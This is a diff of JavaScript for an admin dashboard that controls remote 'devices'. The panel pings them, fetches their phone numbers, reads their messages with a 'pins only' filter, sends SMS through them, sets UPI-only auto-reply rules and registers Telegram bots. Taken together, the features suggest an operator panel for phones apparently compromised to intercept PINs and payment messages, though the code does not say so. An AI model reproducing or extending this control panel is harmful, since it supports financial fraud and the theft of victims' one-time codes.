+$("#dvPing").addEventListener("click", () => state.activeDevice && pingDevice(state.activeDevice));
+$("#dvFetchNum").addEventListener("click", () => state.activeDevice && fetchDeviceNumber(state.activeDevice));
 
-$("#dvRefresh").addEventListener("click", async () => {
-    try {
-        await loadDevices();
-        await loadMessages();
-        showToast("device refreshed");
-    } catch (e) { showToast(e.message); }
+$("#dvMoreToggle").addEventListener("click", () => {
+    const box = $("#dvMore");
+    box.hidden = !box.hidden;
+    $("#dvMoreToggle").textContent = box.hidden ? "show" : "hide";
 });
 
 $("#dvSend").addEventListener("click", async () => {
     const d = state.activeDevice;
     if (!d) return;
+
     const body = $("#dvBody").value.trim();
     if (!body) { showToast("message khali hai"); return; }
 
+    const info = numberInfo(d);
+    let to = $("#dvTo").value.trim();
+    if (!to) to = info.live || info.entered || "";
+
+    if (!to) showToast("target number nahi mila — To field me daalo");
+
     const btn = $("#dvSend");
     btn.disabled = true;
-    try {
-        await api("/admin/send", {
-            method: "POST",
-            body: JSON.stringify({
-                target: "device",
-                device_id: getDeviceId(d),
-                to: $("#dvTo").value.trim() || null,
-                body
-            })
-        });
-        $("#dvBody").value = "";
-        showToast(`queued → ${getDeviceName(d)}`);
-        await loadMessages();
-    } catch (e) { showToast(e.message); }
-    finally { btn.disabled = false; }
+    const ok = await sendSms({ deviceId: getDeviceId(d), deviceName: getDeviceName(d), to: to || null, body });
+    if (ok) $("#dvBody").value = "";
+    btn.disabled = false;
 });
 
 $("#bulkSend").addEventListener("click", async () => {
@@ -2577,10 +2476,7 @@ $("#ruleAdd").addEventListener("click", async () => {
     try {
         await api("/admin/rules", {
             method: "POST",
-            body: JSON.stringify({
-                name, match, reply,
-                upi_only: $("#ruleUpiOnly").checked
-            })
+            body: JSON.stringify({ name, match, reply, upi_only: $("#ruleUpiOnly").checked })
         });
         $("#ruleName").value = "";
         $("#ruleMatch").value = "";
@@ -2595,21 +2491,12 @@ $("#botSave").addEventListener("click", async () => {
     const token = $("#botToken").value.trim();
     const channel = $("#botChannel").value.trim();
 
-    if (!token || !channel) {
-        showToast("token aur channel dono chahiye (token paste karo)");
-        return;
-    }
-    if (token.length < 20) {
-        showToast("token chhota lag raha hai — pura token paste karo");
-        return;
-    }
+    if (!token || !channel) { showToast("token aur channel dono chahiye (token paste karo)"); return; }
+    if (token.length < 20) { showToast("token chhota lag raha hai — pura token paste karo"); return; }
 
     $("#botSave").disabled = true;
     try {
-        await api("/admin/telegram/bots", {
-            method: "POST",
-            body: JSON.stringify({ token, channel })
-        });
+        await api("/admin/telegram/bots", { method: "POST", body: JSON.stringify({ token, channel }) });
         showToast("bot saved — verification code ready");
         await loadTelegram();
     } catch (e) { showToast(e.message); }
@@ -2627,7 +2514,6 @@ $("#msgFilter").addEventListener("change", renderMessages);
 $("#msgSearch").addEventListener("input", renderMessages);
 
 /* ------------------------------------------------------- listeners */
-
 $("#loginForm").addEventListener("submit", async (e) => {
     e.preventDefault();
     const btn = $("#loginButton");
@@ -2638,10 +2524,7 @@ $("#loginForm").addEventListener("submit", async (e) => {
     try {
         const r = await api("/admin/login", {
             method: "POST",
-            body: JSON.stringify({
-                username: $("#username").value.trim(),
-                password: $("#password").value
-            })
+            body: JSON.stringify({ username: $("#username").value.trim(), password: $("#password").value })
         });
         if (!r.status && !r.authenticated) throw new Error("Sign-in failed");
 
@@ -2649,6 +2532,7 @@ $("#loginForm").addEventListener("submit", async (e) => {
         setLoginMessage("Signed in", "success");
         showDashboard();
         await refreshAll();
+        startRealtime();
         showToast("welcome, operator");
     } catch (err) {
         setLoginMessage(err.message || "Access denied");
@@ -2660,6 +2544,9 @@ $("#loginForm").addEventListener("submit", async (e) => {
 
 $("#logoutButton").addEventListener("click", async () => {
     try { await api("/admin/logout", { method: "POST" }); } catch {}
+    try { state.ws && state.ws.close(); } catch {}
+    clearTimeout(state.pollTimer);
+    clearTimeout(state.wsTimer);
     state.devices = [];
     state.messages = [];
     state.pinsOnly = false;
@@ -2668,17 +2555,9 @@ $("#logoutButton").addEventListener("click", async () => {
     showToast("logged out");
 });
 
-document.querySelectorAll(".nav-button").forEach((b) => {
-    b.addEventListener("click", () => navigate(b.dataset.page));
-});
-
-document.querySelectorAll("[data-goto]").forEach((b) => {
-    b.addEventListener("click", () => navigate(b.dataset.goto));
-});
-
-document.querySelectorAll("[data-refresh]").forEach((b) => {
-    b.addEventListener("click", () => refreshSection(b.dataset.refresh));
-});
+document.querySelectorAll(".nav-button").forEach((b) => b.addEventListener("click", () => navigate(b.dataset.page)));
+document.querySelectorAll("[data-goto]").forEach((b) => b.addEventListener("click", () => navigate(b.dataset.goto)));
+document.querySelectorAll("[data-refresh]").forEach((b) => b.addEventListener("click", () => refreshSection(b.dataset.refresh)));
 
 $("#refreshButton").addEventListener("click", refreshAll);
 
@@ -2686,11 +2565,12 @@ document.addEventListener("keydown", (e) => {
     if (e.key === "Escape" && !$("#deviceDetail").hidden) closeDeviceDetail();
 });
 
-/* --------------------------------------------------- live polling */
-
-setInterval(() => {
-    if (state.authenticated) { loadDevices(); loadMessages(); }
-}, 15000);
+document.addEventListener("visibilitychange", () => {
+    if (!document.hidden && state.authenticated) {
+        loadDevices().catch(() => {});
+        loadMessages().catch(() => {});
+    }
+});
 
 checkAuth();
 </script>
